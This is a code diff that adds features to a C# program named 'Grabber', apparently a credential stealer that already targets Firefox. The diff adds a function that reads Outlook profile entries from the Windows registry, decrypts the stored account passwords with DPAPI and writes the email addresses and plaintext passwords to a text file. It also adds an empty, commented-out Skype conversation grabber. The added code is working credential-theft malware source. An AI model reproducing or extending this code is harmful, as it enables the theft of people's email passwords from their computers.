@@ -25,6 +25,7 @@ using System.ComponentModel;
 using System.Xml;
 using System.Security.Principal;
 using System.Diagnostics;
+using Microsoft.Win32;
 
 
 namespace Grabber
@@ -59,6 +60,17 @@ namespace Grabber
             }
 
             catch { Console.WriteLine("Firefox failed"); }
+            #endregion
+
+            #region Outlook
+            grabOutlookPasswords(cd, home);
+
+            #endregion
+
+            #region Skype Convos
+
+
+
             #endregion
 
             #region Admin Stuff
@@ -232,6 +244,98 @@ namespace Grabber
 
             else return false;
         }
+
+        static bool grabOutlookPasswords(string cd, string home)
+        {
+            List<string> accounts = new List<string>();
+
+            RegistryKey baseKey = Registry.CurrentUser;
+
+            RegistryKey profilesKey = baseKey.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook");
+
+            string[] profiles = profilesKey.GetSubKeyNames();
+
+            foreach (string profile in profiles)
+            {
+                RegistryKey key = profilesKey.OpenSubKey(profile);
+
+                if (key.SubKeyCount > 0)
+                {
+                    string[] subkeys = key.GetSubKeyNames();
+
+                    foreach (string subkey in subkeys)
+                    {
+                        RegistryKey key2 = key.OpenSubKey(subkey);
+
+                        byte[] emailBytes = (byte[])key2.GetValue("Email");
+
+                        if (emailBytes != null)
+                        {
+                            string email = Encoding.Default.GetString(emailBytes);
+                            email = email.Replace("\0", "");
+
+                            accounts.Add(email);
+
+                            string password;
+                            foreach (string passKey in key2.GetValueNames())
+                            {
+                                if (passKey.Contains("Password"))
+                                {
+                                    byte[] encryptedPassword = (byte[])key2.GetValue(passKey);
+
+                                    if (encryptedPassword[0] == 2)
+                                    {
+                                        List<byte> list = new List<byte>(encryptedPassword);
+                                        list.RemoveAt(0);
+                                        encryptedPassword = list.ToArray();
+                                    }
+
+                                    byte[] outBytes = DPAPI.decryptBytes(encryptedPassword);
+
+                                    password = Encoding.Default.GetString(outBytes);
+                                    password = password.Replace("\0", "");
+
+                                    accounts.Add(password);
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+
+            if (accounts.Count > 0)
+            {
+                Directory.CreateDirectory(cd + "\\Outlook");
+
+                File.WriteAllLines(cd + "\\Outlook\\accounts.txt", accounts.ToArray());
+
+                return true;
+            }
+
+            return false;
+        }
+
+        /*static bool grabSkypeConvos(string cd, string home)
+        {
+            string skypeDirectory = Environment.ExpandEnvironmentVariables("%APPDATA%");
+            skypeDirectory += @"\Skype";
+
+            if (Directory.Exists(skypeDirectory))
+            {
+                string[] accounts = Directory.GetDirectories(skypeDirectory);
+
+                string[] ignore = { @"Content", @"My Skype Received Files",  };
+
+                foreach (string dir in accounts)
+                {
+
+                }
+
+                return true;
+            }
+
+            else return false;
+        }*/
 
 
         /* WiFi
